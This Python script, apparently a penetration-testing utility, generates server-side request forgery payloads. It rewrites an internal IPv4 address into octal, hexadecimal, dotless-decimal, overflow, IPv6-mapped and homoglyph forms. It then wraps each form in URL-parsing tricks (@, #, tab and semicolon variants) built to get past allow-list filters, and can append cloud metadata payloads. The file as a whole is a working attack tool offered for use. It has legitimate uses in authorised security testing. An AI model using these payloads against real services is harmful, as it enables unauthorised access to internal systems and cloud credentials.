#!/usr/bin/env python3

import argparse
import datetime
import ipaddress
import logging
from random import *
import string
from urllib.parse import urlparse

PERMUTATIONS_LIST = []
OUTPUT_LIST = []
RANDOM_NUMBERS = str(randint(0, 9)) + str(randint(0, 9)) + str(randint(0, 9))
CLOUD_PAYLOADS_LIST = []
SCHEMES_LIST = []

logging.basicConfig(level=logging.INFO, format="")
log = logging.getLogger()

HOMOGLYPHS = {
    "0": ["⓪", "０", "𝟎", "𝟘", "𝟢", "𝟬", "𝟶", "⁰", "₀"],
    "1": ["①", "１", "𝟏", "𝟙", "𝟣", "𝟭", "𝟷", "¹", "₁"],
    "2": ["②", "２", "𝟐", "𝟚", "𝟤", "𝟮", "𝟸", "²", "₂"],
    "3": ["③", "３", "𝟑", "𝟛", "𝟥", "𝟯", "𝟹", "³", "₃"],
    "4": ["④", "４", "𝟒", "𝟜", "𝟦", "𝟰", "𝟺", "⁴", "₄"],
    "5": ["⑤", "５", "𝟓", "𝟝", "𝟧", "𝟱", "𝟻", "⁵", "₅"],
    "6": ["⑥", "６", "𝟔", "𝟞", "𝟨", "𝟲", "𝟼", "⁶", "₆"],
    "7": ["⑦", "７", "𝟕", "𝟟", "𝟩", "𝟳", "𝟽", "⁷", "₇"],
    "8": ["⑧", "８", "𝟖", "𝟠", "𝟪", "𝟴", "𝟾", "⁸", "₈"],
    "9": ["⑨", "９", "𝟗", "𝟡", "𝟫", "𝟵", "𝟿", "⁹", "₉"],
}


def random_text_special():
    """Generates 12-16 characters (comprised of random alphanumeric + special) for ssrf_permutations function

    Returns:
        string: 12-16 character string of random alphanumeric + defined special characters
    """
    min_char = 12
    max_char = 16
    chars = string.ascii_letters + string.digits + "!$%^&*()<>;:,.|\~`"
    return "".join(choice(chars) for x in range(randint(min_char, max_char)))


RANDOM_PREFIX_SPECIAL = random_text_special()


def random_text():
    """Generates 12-16 alphanumeric characters for ssrf_permutations function

    Returns:
        string: 12-16 character string of random alphanumeric characters
    """
    min_char = 12
    max_char = 16
    chars = string.ascii_letters + string.digits
    return "".join(choice(chars) for x in range(randint(min_char, max_char)))


RANDOM_PREFIX_TEXT = random_text()


def octal(number):
    """Takes integer and returns octal value, stripping Python-specific "o" octal prefix

    Args:
        number (int): integer as input

    Returns:
        Octal string with Python-specific octal prefix ("o") stripped
    """
    return str(oct(int(number))).replace("o", "")


def decimal_single(number, step):
    return int(number) * (256**step)


def list_to_dotted_ipv4(ipv4_list, delimeter="."):
    """Takes IPv4 fragments list as input and returns dot-separated fragments as string

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
        delimeter (str, optional): Delimeter used to join list. Defaults to ".".

    Returns:
        string: dot-notation IPv4 address
    """
    str_ipv4_list = map(str, ipv4_list)
    dotted_ipv4 = delimeter.join(str_ipv4_list)
    return dotted_ipv4


def ipv4_to_list(ipv4):
    """Takes dot-separated IPv4 string as input and returns list of fragments split at . delimeter

    Args:
        ipv4 (str): dotted IPv4 string (e.g. "127.0.0.1")

    Returns:
        list: dot-separated list of IPv4 fragments
    """
    ipv4_list = ipv4.split(".")
    return ipv4_list


def dotted_hexadecimal(ipv4_list):
    """Takes IPv4 fragments list as input and generates dot-separated hexadecimal IPv4 address

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    PERMUTATIONS_LIST.append(
        f"{hex(ipv4_list[0])}.{hex(ipv4_list[1])}.{hex(ipv4_list[2])}.{hex(ipv4_list[3])}"
    )


def shorthand(ipv4_list, index_item, index_item_2=None):
    """Takes IPv4 fragments list and index search term(s) as input, generates dot-separated string shorthand variants of IP

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
        index_item (any): search value to return matched index(es) for
        index_item_2 (any, optional): search value to return matched index(es) for. Defaults to None.
    """
    indicies = return_indicies_of_match(ipv4_list, index_item, index_item_2)
    if indicies == [1, 2]:
        PERMUTATIONS_LIST.append(list_to_dotted_ipv4([ipv4_list[0], ipv4_list[2], ipv4_list[3]]))
        PERMUTATIONS_LIST.append(list_to_dotted_ipv4([ipv4_list[0], ipv4_list[3]]))
    if indicies == [2]:
        PERMUTATIONS_LIST.append(list_to_dotted_ipv4([ipv4_list[0], ipv4_list[1], ipv4_list[3]]))
    if indicies == [0, 1, 2]:
        PERMUTATIONS_LIST.append(list_to_dotted_ipv4([ipv4_list[3]]))


def dotless_decimal(ipv4_list):
    """Takes IPv4 fragments list as input and generates dotless decimal notation of IP

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    PERMUTATIONS_LIST.append(str(int(ipaddress.ip_address(list_to_dotted_ipv4(ipv4_list)))))


def dotted_octal(ipv4_list):
    """Takes IPv4 fragments list as input and generates dotted octal notation of IP
    Additionally generates shorthand permutations of output where applicable

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    dotted_octal_string = f"{octal(ipv4_list[0])}.{octal(ipv4_list[1])}.{octal(ipv4_list[2])}.{octal(ipv4_list[3])}"
    PERMUTATIONS_LIST.append(dotted_octal_string)
    dotted_octal_list = [octal for octal in dotted_octal_string.split(".")]
    dotted_octal_list_variant = [octal for octal in dotted_octal_string.replace("00", "0").split(".")]
    shorthand(dotted_octal_list, "00")
    shorthand(dotted_octal_list_variant, "0")


def decimal_overflow(ipv4_list):
    """Takes IPv4 fragments list as input and generates dot-separated decimal overflow IP

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    overflow_list = [str(int(item) + 256) for item in ipv4_list]
    PERMUTATIONS_LIST.append(list_to_dotted_ipv4(overflow_list))


def dotted_octal_with_padding(ipv4_list):
    """Takes IPv4 fragments list as input and generates dot-separated octal notation IP with padding

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    dotted_octal_string = f"0{octal(ipv4_list[0])}.00{octal(ipv4_list[1])}.000{octal(ipv4_list[2])}.0000{octal(ipv4_list[3])}"
    PERMUTATIONS_LIST.append(dotted_octal_string)


def compact_ipv6(ipv4_string):
    """Converts dot-separated IPv4 string to compact IPv6 string

    Args:
        ipv4_string (str): dotted IPv4 string (e.g. "127.0.0.1")
    """
    PERMUTATIONS_LIST.append(f"[::{ipv4_string}]")


def compact_ipv6_with_bypass(ipv4_string):
    """Converts dot-separated IPv4 string to compact IPv6 string with arbitrary number as scope ID for potential bypasses

    Args:
        ipv4_string (str): dotted IPv4 string (e.g. "127.0.0.1")
    """
    PERMUTATIONS_LIST.append(f"[::{ipv4_string}%{RANDOM_NUMBERS}]")


def ipv6_mapped_version(ipv4_string):
    """Converts dot-separated IPv4 string to mapped IPv6 string

    Args:
        ipv4_string (str): dotted IPv4 string (e.g. "127.0.0.1")
    """
    PERMUTATIONS_LIST.append(f"[::ffff:{ipv4_string}]")


def ipv6_mapped_version_with_bypass(ipv4_string):
    """Converts dot-separated IPv4 string to mapped IPv6 string with arbitrary number as scope ID for potential bypasses

    Args:
        ipv4_string (str): dotted IPv4 string (e.g. "127.0.0.1")
    """
    PERMUTATIONS_LIST.append(f"[::ffff:{ipv4_string}%{RANDOM_NUMBERS}]")


def dotted_hexadecimal_dotted_octal_dotless_decimal(ipv4_list):
    """Takes IPv4 fragments list as input and generates mix of hex, octal, decimal, dotted and dotless notation IP string.
    Additionally generates shorthand permutations of output where applicable

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    dotted_hexadecimal_dotted_octal_dotless_decimal_string = f"{hex(ipv4_list[0])}.{octal(ipv4_list[1])}.{decimal_single(ipv4_list[2], 1)}.{decimal_single(ipv4_list[3], 0)}"
    PERMUTATIONS_LIST.append(dotted_hexadecimal_dotted_octal_dotless_decimal_string)
    dotted_hexadecimal_dotted_octal_dotless_decimal_list = ipv4_to_list(dotted_hexadecimal_dotted_octal_dotless_decimal_string)
    shorthand(dotted_hexadecimal_dotted_octal_dotless_decimal_list, "00")
    shorthand(dotted_hexadecimal_dotted_octal_dotless_decimal_list, "0")


def dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal(ipv4_list):
    """Takes IPv4 fragments list as input and generates mix of hex, padded octal, decimal, dotted and dotless notation IP string.
    Additionally generates shorthand permutations of output where applicable

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal_string = f"0{octal(ipv4_list[0])}.{hex(ipv4_list[1])}.{decimal_single(ipv4_list[2], 1)}.{decimal_single(ipv4_list[3], 0)}"
    PERMUTATIONS_LIST.append(dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal_string)
    dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal_list = ipv4_to_list(dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal_string)
    shorthand(dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal_list, "0")
    shorthand(dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal_list, "0x0", "0")


def homoglyph_dots(ipv4_list):
    """Takes IPv4 fragments list as input, generates three Unicode-dotted string variants of IP

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    PERMUTATIONS_LIST.append(list_to_dotted_ipv4(ipv4_list, "。"))
    PERMUTATIONS_LIST.append(list_to_dotted_ipv4(ipv4_list, "｡"))
    PERMUTATIONS_LIST.append(list_to_dotted_ipv4(ipv4_list, "．"))


def homoglyph_numbers(ipv4_list):
    """Takes IPv4 fragments list as input, generates homoglyph string IP variants per HOMOGLYPHS dictionary

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
    """
    ipv4_string = list_to_dotted_ipv4(ipv4_list)
    range_number = len(HOMOGLYPHS["0"])
    for n in range(range_number):
        tmp = ipv4_string
        for character in tmp:
            if character in HOMOGLYPHS:
                tmp = tmp.replace(character, HOMOGLYPHS[character][n])
        PERMUTATIONS_LIST.append(tmp)


def return_indicies_of_match(ipv4_list, search_element, search_element_2=None):
    """Takes list and search element(s) as input, returns list of indicies where element(s) are matched

    Args:
        ipv4_list (list): list of IP fragments (e.g. [127, 0, 0, 1])
        search_element (any): search value to return matched index(es) for
        search_element_2 (any, optional): search value to return matched index(es) for. Defaults to None.

    Returns:
        list: indicies of matched search_element(s)
    """
    indices = [
        index
        for index, element in enumerate(ipv4_list)
        if element == search_element or element == search_element_2
    ]
    return indices


def validate_ipv4_input(ipv4_input, scheme_inputted=False):
    """Takes IPv4 string as input; returns scheme, ipv4, ipv4_list and scheme_inpputed variables as applicable

    Args:
        ipv4_string (str): dotted IPv4 string (e.g. "127.0.0.1")

    Returns:
        str, str, list, bool: returns scheme(str), ipv4(str),  ipv4_list(str) and scheme_inputted(boolean)
    """
    parsed_ipv4 = urlparse(ipv4_input)
    if parsed_ipv4.scheme:
        scheme = f"{parsed_ipv4.scheme}://"
        scheme_inputted = True
    else:
        scheme = "http://"
        scheme_inputted = False
    if parsed_ipv4.hostname:
        ipv4 = parsed_ipv4.hostname
        ipv4_list = [int(x) for x in ipv4.split(".")]
        return scheme, ipv4, ipv4_list, scheme_inputted
    try:
        if ipaddress.ip_address(ipv4_input):
            ipv4 = format(ipaddress.ip_address(ipv4_input))
            ipv4_list = [int(x) for x in ipv4.split(".")]
            scheme = "http://"
    except Exception as e:
        log.critical(f"[-] Invalid IPv4 address inputted: {e}")
    return scheme, ipv4, ipv4_list, scheme_inputted


def lines_to_list(filename):
    """Takes filename as input, returns list of line-separated data as represented in original file

    Args:
        filename (str): filename containing line-separated values

    Returns:
        list: list of values originally represented as line-separated items in file
    """
    try:
        with open(filename) as f:
            data = [line.rstrip() for line in f.readlines()]
            f.close()
            return data
    except Exception as e:
        log.critical(f"[-] Unable to open {filename}: {e}")


def deduplicate_list(list_object):
    """Takes list as input and returns deduplicated version of that list

    Args:
        list_object (list): Python list object to be deduplicated

    Returns:
        list: deduplicated list
    """
    deduplicated_list = list(set(list_object))
    return deduplicated_list


def write_list_to_file(filename, list_input):
    """Takes filename, list as input and writes list as line-separated values to filename

    Args:
        filename (str): Name of file to write list to
        list_input (list): Data (list) to be written to specified filename
    """
    try:
        with open(filename, "a") as f:
            [f.write(f"{line}\n") for line in list_input]
            f.close()
    except Exception as e:
        log.critical(f"[-] Unable to create {filename}: {e}")


def ssrf_permutations(scheme, ip_string, allowed_hostname, port=""):
    """Generates SSRF payloads based on provided scheme, IP, allow-listed hostname and (optional) port

    Args:
        scheme (str): scheme as specified by user's -i prefix; otherwise defaults to http://
        ip_string (str): IPv4 address stored in PERMUTATIONS_LIST
        allowed_hostname (str): hostname (domain or IP address) as provided by -a flag
        port (str, optional): Port (e.g :8080) as specified by -p flag. Defaults to "".
    """
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}?@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}#@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{allowed_hostname}@{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_TEXT}@{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_SPECIAL}@{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_TEXT}@{ip_string}{port}@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_SPECIAL}@{ip_string}:@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_TEXT}@{ip_string}{port}+@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_SPECIAL}@{ip_string}:+@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_TEXT}@{allowed_hostname}@{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{RANDOM_PREFIX_SPECIAL}@{allowed_hostname}@{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}+&@{allowed_hostname}#+@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{allowed_hostname}+&@{ip_string}{port}#+@{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{allowed_hostname}+&@{allowed_hostname}#+@{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}:80/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}\\t{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}%09{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port}%2509{allowed_hostname}/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}%20{allowed_hostname}{port}/")
    OUTPUT_LIST.append(f"{scheme}{allowed_hostname}@@{ip_string}{port}/")
    OUTPUT_LIST.append(f"{scheme}{allowed_hostname}@@@{ip_string}{port}/")
    OUTPUT_LIST.append(f"0://{ip_string}{port};{allowed_hostname}:80/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port};{allowed_hostname}:80/")
    OUTPUT_LIST.append(f"0://{ip_string}{port},{allowed_hostname}:80/")
    OUTPUT_LIST.append(f"{scheme}{ip_string}{port},{allowed_hostname}:80/")


def filename_generator(prefix, extension):
    """Takes prefix and extension strings as input, returns timestamped filename string including inputted prefix/extension

    Args:
        prefix (str): prefix to timestamp value in filename output
        extension (str): extension type (e.g. txt)

    Returns:
        str: timestamped filename string
    """
    return f"{prefix}-{str(datetime.datetime.now().strftime('%H-%M-%d-%m-%Y'))}.{extension}"


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-i",
        "--ip_address",
        help="Accepts dot-decimal IPv4 address as input (e.g. 127.0.0.1); scheme prefixes (e.g. https://127.0.0.1) are supported",
        required="True",
        action="store",
    )
    parser.add_argument(
        "-a",
        "--allowed_host",
        help="Allow-listed/valid domain/IPv4 address used for redirection/SSRF bypasses",
        action="store",
        required="True",
    )
    parser.add_argument(
        "-p",
        "--port",
        help="Port of target service (e.g. 443)",
        action="store",
        default="",
    )
    parser.add_argument(
        "-sG",
        "--scheme_generation",
        help="Generate payloads with scheme variations (from schemes.txt)",
        action="store_true",
    )
    parser.add_argument(
        "-cP",
        "--cloud_payloads",
        help="Output common cloud service payloads unrelated to IPv4 input (from cloud_pay",
        action="store_true",
    )
    parser.add_argument(
        "-nB",
        "--no_bypasses",
        help="Print IPv4 notation variants only; do not include SSRF bypass permutations",
        action="store_true",
    )

    args = parser.parse_args()

    try:
        scheme, ipv4, ipv4_list, scheme_inputted = validate_ipv4_input(args.ip_address)
        if args.port:
            args.port = f":{args.port}"
        shorthand(ipv4_list, 0)
        dotted_hexadecimal(ipv4_list)
        dotless_decimal(ipv4_list)
        dotted_octal(ipv4_list)
        decimal_overflow(ipv4_list)
        dotted_octal_with_padding(ipv4_list)
        compact_ipv6(ipv4)
        compact_ipv6_with_bypass(ipv4)
        ipv6_mapped_version(ipv4)
        ipv6_mapped_version_with_bypass(ipv4)
        dotted_hexadecimal_dotted_octal_dotless_decimal(ipv4_list)
        dotted_octal_with_padding_dotted_hexadecimal_dotless_decimal(ipv4_list)
        homoglyph_dots(ipv4_list)
        homoglyph_numbers(ipv4_list)
        PERMUTATIONS_LIST = deduplicate_list(PERMUTATIONS_LIST)
        for item in PERMUTATIONS_LIST:
            ssrf_permutations(scheme, item, args.allowed_host, args.port)
        OUTPUT_LIST = deduplicate_list(OUTPUT_LIST)
        if args.scheme_generation:
            SCHEMES_LIST = lines_to_list("schemes.txt")
            SCHEMES_LIST = [
                f"{scheme_item}://{ip}"
                for scheme_item in SCHEMES_LIST
                for ip in PERMUTATIONS_LIST if scheme_item != scheme.split(":")[0]
            ]
            OUTPUT_LIST = OUTPUT_LIST + SCHEMES_LIST
        if args.cloud_payloads:
            CLOUD_PAYLOADS_LIST = lines_to_list("cloud-payloads.txt")
            OUTPUT_LIST = OUTPUT_LIST + CLOUD_PAYLOADS_LIST
        output_filename = filename_generator(ipv4, "txt")
        if args.no_bypasses:
            if scheme_inputted:
                PERMUTATIONS_LIST = [f"{scheme}{permutation}" for permutation in PERMUTATIONS_LIST]
            PERMUTATIONS_LIST = PERMUTATIONS_LIST + SCHEMES_LIST + CLOUD_PAYLOADS_LIST
            [print(f"{item}") for item in PERMUTATIONS_LIST]
            write_list_to_file(output_filename, PERMUTATIONS_LIST)
        else:
            [print(f"{item}") for item in OUTPUT_LIST]
            write_list_to_file(output_filename, OUTPUT_LIST)
        log.info(f"\n[+] Payloads written to {output_filename}")  
    except Exception as e:
        log.critical(f"[-] Failed to complete SSRF payload generation with the following error: {e}")
